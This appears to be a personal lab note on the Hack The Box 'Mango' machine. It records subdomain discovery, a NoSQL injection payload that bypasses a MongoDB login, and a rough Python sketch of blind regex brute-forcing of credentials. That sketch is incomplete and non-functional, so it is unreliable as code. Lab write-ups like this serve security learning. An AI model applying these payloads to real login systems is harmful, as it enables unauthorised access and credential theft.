![[Pasted image 20230503200334.png]]

Search engine makes requests to itself and does absolutely nothing.

![[Pasted image 20230503200637.png]]

There is some returned data, possibly within charts. There are some `connect` options that connect to databases, potential for abuse.

![[Pasted image 20230503201146.png]]
I've completely forgotten about adding the subdomain to `/etc/hosts`. With name resolution, there's now a different `http` site under the subdomain `http://staging-order.mango.htb:`
![[Pasted image 20230503202342.png]]

`username[$ne]=lemur&password[$ne]=lemur&login=login` gets me past login.
![[Pasted image 20230503203015.png]]
`Under Plantation`, `Sorry for the inconvenience`. `Please email admin@mango.htb`

I already know that this thing is running MongoDB. It uses NoSQL and therefore is a `document database`.  It can be searched using a json-type format. This can potentially be used from the login screen in order to brute force usernames/passwords from the database.

Since this thing is already vulnerable to auth bypass, it will likely divulge information on a sort-of `boolean based bruteforcing attack`.

```python
import requests, urllib3, string, urllib
urllib3.disable_warnings()

username=""
password=""

while True:
	for char in string.printable:
		if char not in ['*','+','.','?','|']:
			payload='{"username":{"$regex":"^%s"}, "password":{"$regex":"^%s"}}' % (username + char, password + char)

	if "sorry for the inconvenience" in response.text:
		password += char
		# et cetera
```

something like this could give us blind-boolean indicators but since i'm not the greatest programmer and currently not-giving-a-fuck to learn how, I will find a script online to use and perhaps try to modify it. maybe then I can actually get good with python... i'm tired. leave me alone.

Awesome script: https://github.com/eversinc33/Papaya/tree/875a1585f8f0776963c8b004597e7290b530b11c

![[Pasted image 20230503214140.png]]

Mongo:
![[Pasted image 20230503214717.png]]
Admin:
![[Pasted image 20230503215044.png]]






